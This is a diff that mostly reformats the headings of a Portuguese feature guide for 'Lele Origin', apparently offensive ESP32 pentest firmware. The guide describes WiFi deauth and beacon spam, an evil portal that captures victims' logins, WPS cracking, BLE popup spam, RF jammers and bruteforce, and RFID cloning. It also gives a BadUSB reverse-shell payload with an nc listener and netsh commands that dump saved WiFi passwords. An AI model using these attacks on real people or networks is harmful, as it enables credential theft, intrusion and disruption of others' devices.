@@ -2,7 +2,7 @@
 
 > **Guia ULTRA-DETALHADO** de todas as funcionalidades do firmware Lele Origin.
 > Cada opção explicada com: O QUE FAZ, COMO USAR, O QUE SIGNIFICA cada informação.
-> Última atualização: 2024-12-13
+> Última atualização: 2025-12-17
 
 ---
 
@@ -42,15 +42,17 @@ O menu WiFi é o mais completo do sistema, com dezenas de funcionalidades ofensi
 
 ## 1.1 Conectar AP
 
-### O que faz:
+### O que faz
+
 Conecta o dispositivo a uma rede WiFi existente. Necessário para funcionalidades que precisam de internet (SSH, Telnet, NTP, Wigle upload).
 
-### Como usar:
+### Como usar
+
 1. Selecione "Conectar AP"
 2. Aguarde o scan (5-10 segundos)
 3. Aparece lista de redes
 
-### O que aparece na tela:
+### O que aparece na tela
 
 ```
 Redes WiFi Disponíveis
@@ -60,7 +62,7 @@ Redes WiFi Disponíveis
  RedeAberta (-80|Open)
 ```
 
-### Significado de cada parte:
+### Significado de cada parte
 
 | Parte | Exemplo | Significado |
 |-------|---------|-------------|
@@ -69,27 +71,31 @@ Redes WiFi Disponíveis
 | `(-45)` | `-45 dBm` | **Força do sinal**: -30 a -50 = Excelente, -50 a -70 = Bom, -70 a -85 = Fraco, abaixo de -85 = Muito fraco |
 | `WPA2/PSK` | | Tipo de criptografia (WPA2 é seguro, WEP é fraco, Open = sem senha) |
 
-### Preenchimento:
+### Preenchimento
+
 - Ao selecionar uma rede com senha, aparece teclado virtual
 - **Digite a senha**: Mínimo 8 caracteres para WPA/WPA2
 - Se a senha estiver errada: Mostra "Conexão falhou"
 - Se correto: Mostra IP obtido (ex: 192.168.1.105)
 
-### Dica:
+### Dica
+
 Redes salvas aparecem automaticamente da próxima vez.
 
 ---
 
 ## 1.2 Iniciar WiFi AP
 
-### O que faz:
+### O que faz
+
 Cria um ponto de acesso WiFi próprio. Outros dispositivos podem se conectar ao Lele.
 
-### Como usar:
+### Como usar
+
 1. Selecione "Iniciar WiFi AP"
 2. O AP inicia imediatamente
 
-### O que aparece na tela:
+### O que aparece na tela
 
 ```
 AP Iniciado!
@@ -100,16 +106,17 @@ IP: 192.168.4.1
 Clientes: 0
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado | Uso |
 |-------|-------------|-----|
 | **SSID** | Nome da rede que aparece | Busque "Lele_AP" no celular/PC |
 | **Senha** | Senha para conectar | Digite exatamente como mostrado |
-| **IP** | Endereço do Lele na rede | Acesse http://192.168.4.1 no navegador |
+| **IP** | Endereço do Lele na rede | Acesse <http://192.168.4.1> no navegador |
 | **Clientes** | Quantos conectados | Aumenta quando alguém entra |
 
-### Como acessar a Web UI:
+### Como acessar a Web UI
+
 1. Conecte celular/PC ao "Lele_AP"
 2. Abra navegador
 3. Digite: `http://192.168.4.1`
@@ -119,21 +126,23 @@ Clientes: 0
 
 ## 1.3 Ataques WiFi
 
-### Submenu com 3 tipos principais de ataque:
+### Submenu com 3 tipos principais de ataque
 
 ---
 
 ### 1.3.1 Target Atks (Ataques Direcionados)
 
-### O que faz:
+### O que faz
+
 Escaneia redes e permite ataques específicos em uma rede selecionada.
 
-### Passo a passo:
+### Passo a passo
+
 1. Selecione "Target Atks"
 2. Aguarde scan (10-15 segundos)
 3. Lista de redes aparece
 
-### O que aparece:
+### O que aparece
 
 ```
 Selecione Alvo
@@ -144,7 +153,7 @@ Selecione Alvo
  WIFI_GRATIS (-78|Open)
 ```
 
-### Ao selecionar uma rede, aparece submenu:
+### Ao selecionar uma rede, aparece submenu
 
 | Opção | O que faz | Quando usar |
 |-------|-----------|-------------|
@@ -156,10 +165,11 @@ Selecione Alvo
 
 ### 1.3.2 Beacon SPAM
 
-### O que faz:
+### O que faz
+
 Cria dezenas/centenas de redes WiFi falsas simultaneamente.
 
-### Opções:
+### Opções
 
 | Opção | O que faz | Exemplo de redes criadas |
 |-------|-----------|--------------------------|
@@ -167,7 +177,7 @@ Cria dezenas/centenas de redes WiFi falsas simultaneamente.
 | **Random** | Nomes aleatórios | "a7Bk9x", "WiFi_3847", "Network_abc" |
 | **Custom** | Você define a lista | Carrega de arquivo no SD |
 
-### O que aparece durante ataque:
+### O que aparece durante ataque
 
 ```
 BEACON SPAM
@@ -180,7 +190,7 @@ Tempo: 00:45
 [Pressione para parar]
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado |
 |-------|-------------|
@@ -193,13 +203,15 @@ Tempo: 00:45
 
 ### 1.3.3 Deauth Flood
 
-### O que faz:
+### O que faz
+
 Envia pacotes de desautenticação para TODAS as redes próximas simultaneamente.
 
-### ⚠️ AVISO:
+### ⚠️ AVISO
+
 Este ataque afeta TODAS as redes na área. Use com responsabilidade.
 
-### O que aparece:
+### O que aparece
 
 ```
 DEAUTH FLOOD
@@ -218,17 +230,19 @@ Canal atual: 6/13
 
 ## 1.4 Wifite Mode (NOVO!)
 
-### O que faz:
+### O que faz
+
 Automação completa de ataques WiFi, similar ao Wifite do Kali Linux. Escaneia, seleciona alvos automaticamente e ataca.
 
 ---
 
 ### 1.4.1 Scan Redes
 
-### O que faz:
+### O que faz
+
 Escaneia WiFi e conta quantos clientes cada rede tem (aproximado).
 
-### O que aparece:
+### O que aparece
 
 ```
 Escaneando redes...
@@ -242,7 +256,7 @@ Detectando clientes...
 
 ### 1.4.2 Selecionar Alvo
 
-### O que aparece:
+### O que aparece
 
 ```
 Selecione Alvo
@@ -253,7 +267,7 @@ VIVO-A5B3 (-58dB) [2 cli]
 <Hidden> (-78dB) [1 cli]
 ```
 
-### Significado:
+### Significado
 
 | Parte | Exemplo | Significado |
 |-------|---------|-------------|
@@ -262,7 +276,8 @@ VIVO-A5B3 (-58dB) [2 cli]
 | `[5 cli]` | 5 clientes | **Quantos dispositivos conectados** (mais clientes = mais chance de capturar handshake) |
 | `<Hidden>` | | Rede com SSID oculto |
 
-### Por que clientes importam:
+### Por que clientes importam
+
 - **0 clientes**: Difícil capturar handshake (ninguém para desautenticar)
 - **1-3 clientes**: Bom alvo
 - **5+ clientes**: Excelente alvo (mais chances)
@@ -271,16 +286,18 @@ VIVO-A5B3 (-58dB) [2 cli]
 
 ### 1.4.3 Auto: Melhor Sinal
 
-### O que faz:
+### O que faz
+
 Ataca redes automaticamente, começando pela de melhor sinal.
 
-### Processo:
+### Processo
+
 1. Ordena redes por RSSI (melhor sinal primeiro)
 2. Ataca cada uma por 15 segundos
 3. Tenta capturar handshake
 4. Move para próxima
 
-### O que aparece:
+### O que aparece
 
 ```
 WIFITE AUTO
@@ -294,7 +311,8 @@ CH:6 RSSI:-42 CLI:5
 Atacando...
 ```
 
-### Status finais possíveis:
+### Status finais possíveis
+
 - **CAPTURADO!** (verde) = Handshake obtido
 - **Timeout** (vermelho) = Sem sucesso, move para próximo
 
@@ -302,20 +320,23 @@ Atacando...
 
 ### 1.4.4 Auto: Mais Clientes
 
-### O que faz:
+### O que faz
+
 Igual ao anterior, mas prioriza redes com mais clientes conectados.
 
-### Vantagem:
+### Vantagem
+
 Mais clientes = mais chances de capturar handshake legítimo.
 
 ---
 
 ### 1.4.5 Salvar Resultados
 
-### O que faz:
+### O que faz
+
 Salva log do ataque em `/lele/logs/wifite_results.txt`
 
-### Conteúdo do arquivo:
+### Conteúdo do arquivo
 
 ```
 === Wifite Results ===
@@ -338,18 +359,21 @@ Handshake: NO
 
 ## 1.5 Portal Malicioso (Evil Portal)
 
-### O que faz:
+### O que faz
+
 Cria um portal WiFi falso que captura credenciais digitadas pelas vítimas.
 
-### Passo a passo:
+### Passo a passo
+
 1. Selecione "Portal Malicioso"
 2. Escolha template (Facebook, Google, Hotel WiFi, etc.)
 3. O AP inicia com captive portal
 
-### O que a vítima vê:
+### O que a vítima vê
+
 Ao conectar no WiFi, é redirecionada para página de login falsa.
 
-### O que você vê:
+### O que você vê
 
 ```
 EVIL PORTAL
@@ -368,7 +392,7 @@ Senha: senha123
 
 ## 1.6 Hacking WiFi (Menu Consolidado)
 
-### Agrupa ataques avançados:
+### Agrupa ataques avançados
 
 ---
 
@@ -376,10 +400,11 @@ Senha: senha123
 
 ### Scan WPS
 
-### O que faz:
+### O que faz
+
 Procura redes com WPS (Wi-Fi Protected Setup) habilitado.
 
-### O que aparece:
+### O que aparece
 
 ```
 Scanning WPS...
@@ -393,7 +418,7 @@ Scanning WPS...
    BSSID: 11:22:33:44:55:66
 ```
 
-### Após selecionar rede:
+### Após selecionar rede
 
 | Opção | O que faz |
 |-------|-----------|
@@ -401,7 +426,7 @@ Scanning WPS...
 | **Bruteforce PIN** | Testa PINs (10000 combinações) |
 | **PIN Flood** | DoS no WPS |
 
-### Mensagem do Pixie Dust:
+### Mensagem do Pixie Dust
 
 ```
 PIXIE DUST
@@ -422,15 +447,17 @@ O ESP32 não tem poder de processamento para quebrar o PIN. Ele apenas captura o
 
 ### 1.6.2 Submenu IoT
 
-### O que faz:
+### O que faz
+
 Ataques específicos para dispositivos IoT.
 
 ### Scan Chromecasts
 
-### O que faz:
+### O que faz
+
 Procura dispositivos Google Cast na rede.
 
-### O que aparece:
+### O que aparece
 
 ```
 SCAN CHROMECAST
@@ -444,7 +471,8 @@ Encontrados: 2
 [SELECT para atacar]
 ```
 
-### Ações possíveis:
+### Ações possíveis
+
 - **Deauth**: Desconecta o Chromecast do WiFi
 - **Rename**: Muda nome exibido (temporário)
 
@@ -452,11 +480,14 @@ Encontrados: 2
 
 ### Scan Alexa
 
-### O que faz:
+### O que faz
+
 Procura Amazon Echo/Alexa na rede.
 
-### Nota:
+### Nota
+
 Busca por MAC addresses da Amazon (OUI). Se não encontrar sua Alexa:
+
 - Verifique se está na mesma rede
 - Pode ser modelo não detectado pelo OUI
 
@@ -466,10 +497,11 @@ Busca por MAC addresses da Amazon (OUI). Se não encontrar sua Alexa:
 
 ### 1.7.1 Captura RAW
 
-### O que faz:
+### O que faz
+
 Captura TODOS os pacotes WiFi e salva em formato PCAP.
 
-### Configuração:
+### Configuração
 
 ```
 SNIFFER RAW
@@ -479,14 +511,14 @@ Modo: Raw/EAPOL
 Salvar em: SD/LittleFS
 ```
 
-### O que preencher:
+### O que preencher
 
 | Campo | O que colocar | Por que |
 |-------|---------------|---------|
 | **Canal** | 1-13 (ou "Hopping") | Canal que quer monitorar (Hopping = todos) |
 | **Modo** | Raw = tudo, EAPOL = só handshakes | EAPOL é mais focado |
 
-### Durante captura:
+### Durante captura
 
 ```
 SNIFFING...
@@ -501,7 +533,7 @@ Arquivo: capture_001.pcap
 Tamanho: 2.3 MB
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado |
 |-------|-------------|
@@ -514,7 +546,7 @@ Tamanho: 2.3 MB
 
 ## 1.8 Configurar WiFi
 
-### Opções:
+### Opções
 
 | Opção | O que faz | O que preencher |
 |-------|-----------|-----------------|
@@ -530,19 +562,21 @@ Tamanho: 2.3 MB
 
 ## 2.1 BLE Spam (Submenu)
 
-### Ataques de spam Bluetooth que afetam dispositivos próximos.
+### Ataques de spam Bluetooth que afetam dispositivos próximos
 
 ---
 
 ### 2.1.1 Applejuice
 
-### O que faz:
+### O que faz
+
 Envia pacotes BLE que fazem iPhones mostrarem popup de AirPods constantemente.
 
-### O que a vítima vê:
+### O que a vítima vê
+
 Popup infinito: "AirPods Pro detectado. Conectar?"
 
-### O que você vê:
+### O que você vê
 
 ```
 APPLEJUICE
@@ -554,58 +588,67 @@ Alcance: ~10m
 [ESC para parar]
 ```
 
-### Configuração:
+### Configuração
+
 - Pode selecionar modelo: AirPods, AirPods Pro, AirPods Max, Beats
 
 ---
 
 ### 2.1.2 SourApple
 
-### O que faz:
+### O que faz
+
 Versão mais agressiva que pode crashar o Bluetooth em iPhones mais antigos.
 
-### ⚠️ AVISO:
+### ⚠️ AVISO
+
 Pode causar reinício forçado em alguns dispositivos.
 
 ---
 
 ### 2.1.3 Spam Windows
 
-### O que faz:
+### O que faz
+
 Envia pacotes Swift Pair que fazem Windows mostrar notificações de dispositivos Bluetooth.
 
-### O que a vítima vê (Windows):
+### O que a vítima vê (Windows)
+
 Popup: "Dispositivo encontrado: [Teclado/Mouse/Fone]"
 
 ---
 
 ### 2.1.4 Spam Samsung
 
-### O que faz:
+### O que faz
+
 Simula Galaxy Buds para trigger notificações em celulares Samsung.
 
 ---
 
 ### 2.1.5 Spam Android
 
-### O que faz:
+### O que faz
+
 Usa Fast Pair do Google para notificar Androids.
 
 ---
 
 ### 2.1.6 Spam Todos
 
-### O que faz:
+### O que faz
+
 Combina todos os ataques simultaneamente. Afeta iOS, Android, Windows.
 
 ---
 
 ### 2.1.7 Personalizado
 
-### O que faz:
+### O que faz
+
 Permite definir manualmente o tipo de dispositivo BLE.
 
-### O que preencher:
+### O que preencher
 
 ```
 CUSTOM BLE SPAM
@@ -619,17 +662,20 @@ Manufacturer: [0x004C=Apple, 0x0006=MS]
 
 ## 2.2 Teclado BLE
 
-### O que faz:
+### O que faz
+
 Transforma o Lele em um teclado Bluetooth. Pode digitar em qualquer dispositivo pareado.
 
-### Passo a passo:
+### Passo a passo
+
 1. Selecione "Teclado BLE"
 2. No dispositivo alvo, vá em Bluetooth
 3. Procure "Keyboard_XXXX"
 4. Pareie
 5. Use teclado virtual do Lele para digitar
 
-### Usos:
+### Usos
+
 - BadUSB sem fio
 - Digitar senhas remotamente
 - Automação
@@ -638,10 +684,11 @@ Transforma o Lele em um teclado Bluetooth. Pode digitar em qualquer dispositivo 
 
 ## 2.3 Escanear BLE
 
-### O que faz:
+### O que faz
+
 Lista todos dispositivos Bluetooth LE próximos.
 
-### O que aparece:
+### O que aparece
 
 ```
 BLE SCAN
@@ -661,7 +708,7 @@ Dispositivos: 8
    RSSI: -52 dBm
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado |
 |-------|-------------|
@@ -679,15 +726,17 @@ Trabalha com frequências 315MHz, 433MHz, 868MHz, 915MHz.
 
 ## 3.1 Escanear/Copiar
 
-### O que faz:
+### O que faz
+
 Captura sinais de controles remotos, portões, alarmes, etc.
 
-### Passo a passo:
+### Passo a passo
+
 1. Selecione "Escanear/Copiar"
 2. Pressione o botão do controle alvo perto do Lele
 3. Quando capturar, mostra dados
 
-### O que aparece:
+### O que aparece
 
 ```
 RF SCAN
@@ -706,7 +755,7 @@ Repeat: 5
 [ESC] Descartar
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado |
 |-------|-------------|
@@ -720,13 +769,15 @@ Repeat: 5
 
 ## 3.2 Bruteforce
 
-### O que faz:
+### O que faz
+
 Testa todas combinações possíveis de códigos RF.
 
-### ⚠️ AVISO:
+### ⚠️ AVISO
+
 Pode levar HORAS dependendo do protocolo.
 
-### O que preencher:
+### O que preencher
 
 ```
 RF BRUTEFORCE
@@ -739,7 +790,7 @@ End: [0xFFFFFF]
 Delay (ms): [50]
 ```
 
-### Campos:
+### Campos
 
 | Campo | O que colocar | Exemplo |
 |-------|---------------|---------|
@@ -753,17 +804,18 @@ Delay (ms): [50]
 
 ## 3.3 Jammer
 
-### O que faz:
+### O que faz
+
 Interfere em comunicações RF na frequência selecionada.
 
-### Modos:
+### Modos
 
 | Modo | O que faz |
 |------|-----------|
 | **Jammer Itmt** | Liga/desliga rapidamente (intermitente) |
 | **Jammer Total** | Sinal contínuo (mais efetivo, consome mais bateria) |
 
-### O que aparece:
+### O que aparece
 
 ```
 RF JAMMER
@@ -795,16 +847,18 @@ Tempo: 00:15
 
 ## 4.1 Ler Tag
 
-### O que faz:
+### O que faz
+
 Lê dados de cartões NFC/Mifare.
 
-### Cartões suportados:
+### Cartões suportados
+
 - Mifare Classic 1K/4K
 - Mifare Ultralight
 - NTAG213/215/216
 - ISO14443A
 
-### O que aparece:
+### O que aparece
 
 ```
 RFID READ
@@ -825,7 +879,7 @@ Chave default: A/B
 [ESC] Voltar
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado |
 |-------|-------------|
@@ -838,10 +892,12 @@ Chave default: A/B
 
 ## 4.2 Chameleon
 
-### O que faz:
+### O que faz
+
 Interface com dispositivo Chameleon Mini/Tiny para emulação de cartões.
 
-### Passo a passo:
+### Passo a passo
+
 1. Conecte Chameleon via USB/Serial
 2. Selecione slot (1-8)
 3. Carregue dump ou clone ao vivo
@@ -854,10 +910,11 @@ Interface com dispositivo Chameleon Mini/Tiny para emulação de cartões.
 
 ## 5.1 TV-B-Gone
 
-### O que faz:
+### O que faz
+
 Envia códigos de POWER para desligar TVs de várias marcas.
 
-### O que aparece:
+### O que aparece
 
 ```
 TV-B-GONE
@@ -870,7 +927,8 @@ Marca atual: Samsung
 [Transmitindo...]
 ```
 
-### Após terminar:
+### Após terminar
+
 - Se TV desligou: Sucesso!
 - Se não: Tente outra posição ou região
 
@@ -878,10 +936,12 @@ Marca atual: Samsung
 
 ## 5.2 TV NUKE
 
-### O que faz:
+### O que faz
+
 Versão mais agressiva, envia códigos mais rápido e repete.
 
-### Diferença do TV-B-Gone:
+### Diferença do TV-B-Gone
+
 - Envia cada código 3x
 - Muda ângulo de transmissão (se tiver LED múltiplo)
 - Mais chances de sucesso, mas demora mais
@@ -890,15 +950,17 @@ Versão mais agressiva, envia códigos mais rápido e repete.
 
 ## 5.3 IR Read
 
-### O que faz:
+### O que faz
+
 Captura e decodifica sinais de controles remotos.
 
-### Passo a passo:
+### Passo a passo
+
 1. Selecione "IR Read"
 2. Aponte controle para o Lele
 3. Pressione botão do controle
 
-### O que aparece:
+### O que aparece
 
 ```
 IR READ
@@ -917,7 +979,7 @@ Raw: [lista de tempos]
 [A] Retransmitir
 ```
 
-### Significado:
+### Significado
 
 | Campo | Significado |
 |-------|-------------|
@@ -947,10 +1009,11 @@ Trabalha com módulo NRF24L01 para comunicação 2.4GHz.
 
 ## 6.1 Espectro
 
-### O que faz:
+### O que faz
+
 Visualiza atividade em todos 126 canais 2.4GHz.
 
-### O que aparece:
+### O que aparece
 
 ```
 NRF24 SPECTRUM
@@ -963,7 +1026,8 @@ Canal mais ativo: 76
 WiFi detectado: CH 1,6,11
 ```
 
-### Interpretação:
+### Interpretação
+
 - Picos altos = muita atividade
 - Canais 1,6,11 = WiFi (canais 2.4GHz padrão)
 - Canais 37,38,39 = BLE Advertising
@@ -972,10 +1036,11 @@ WiFi detectado: CH 1,6,11
 
 ## 6.2 Jammer NRF
 
-### O que faz:
+### O que faz
+
 Interfere em comunicações 2.4GHz (WiFi, BLE, Zigbee, mouses wireless).
 
-### Modos:
+### Modos
 
 | Opção | O que faz |
 |-------|-----------|
@@ -987,7 +1052,7 @@ Interfere em comunicações 2.4GHz (WiFi, BLE, Zigbee, mouses wireless).
 
 ## 6.3 Ataques Avançados (Dual NRF)
 
-### Requer 2 módulos NRF24 conectados!
+### Requer 2 módulos NRF24 conectados
 
 | Opção | O que faz |
 |-------|-----------|
@@ -1006,10 +1071,11 @@ Interfere em comunicações 2.4GHz (WiFi, BLE, Zigbee, mouses wireless).
 
 ### Reverse Shell
 
-### O que faz:
+### O que faz
+
 Digita comandos que abrem conexão reversa para seu computador.
 
-### O que preencher (no código):
+### O que preencher (no código)
 
 ```cpp
 usb_payload_reverse_shell("192.168.1.100", 4444);
@@ -1020,7 +1086,8 @@ usb_payload_reverse_shell("192.168.1.100", 4444);
 | **IP** | IP do seu PC listener | 192.168.1.100 |
 | **Porta** | Porta para conexão | 4444 |
 
-### No seu PC, execute:
+### No seu PC, execute
+
 ```bash
 nc -lvp 4444
 ```
@@ -1029,10 +1096,12 @@ nc -lvp 4444
 
 ### WiFi Stealer
 
-### O que faz:
+### O que faz
+
 Exporta todas senhas WiFi salvas no Windows.
 
-### Comandos digitados:
+### Comandos digitados
+
 1. Win+R → cmd
 2. `netsh wlan show profiles`
 3. Para cada rede: `netsh wlan show profile name="X" key=clear`
@@ -1042,7 +1111,7 @@ Exporta todas senhas WiFi salvas no Windows.
 
 # 8. 📁 MENU ARQUIVOS
 
-### Operações em arquivos:
+### Operações em arquivos
 
 | Opção | O que faz |
 |-------|-----------|
@@ -1054,7 +1123,7 @@ Exporta todas senhas WiFi salvas no Windows.
 | **Excluir** | Remove permanentemente |
 | **New Folder** | Cria pasta |
 
-### Estrutura padrão SD Card:
+### Estrutura padrão SD Card
 
 ```
 /lele/
@@ -1096,7 +1165,7 @@ Exporta todas senhas WiFi salvas no Windows.
 
 ## 15.3 Monitor de Temperatura
 
-### Opções:
+### Opções
 
 | Opção | O que faz | Valor |
 |-------|-----------|-------|
@@ -1111,16 +1180,19 @@ Exporta todas senhas WiFi salvas no Windows.
 
 ## 15.4 Factory Reset
 
-### O que faz:
+### O que faz
+
 Restaura TODAS as configurações para o padrão de fábrica.
 
-### ⚠️ PERDE:
+### ⚠️ PERDE
+
 - Redes WiFi salvas
 - Configurações de pinos
 - Chaves Mifare adicionadas
 - Preferências de cor/brilho
 
-### O que preencher:
+### O que preencher
+
 Confirme digitando "RESET" no teclado.
 
 ---
